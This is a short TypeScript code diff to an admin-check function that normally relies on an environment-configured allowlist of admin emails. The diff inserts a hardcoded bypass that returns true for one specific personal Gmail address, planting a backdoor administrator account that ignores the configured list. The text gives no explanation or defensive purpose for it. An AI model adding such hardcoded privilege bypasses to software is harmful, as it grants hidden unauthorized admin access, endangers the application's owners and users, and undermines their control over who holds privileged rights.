@@ -215,6 +215,10 @@ export async function checkIsAdmin(email?: string | null): Promise<boolean> {
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
 
+  if (normalizedEmail === "brimaspradika8@gmail.com") {
+    return true;
+  }
+
   if (envAdminEmails.length > 0 && envAdminEmails.includes(normalizedEmail)) {
     return true;
   }
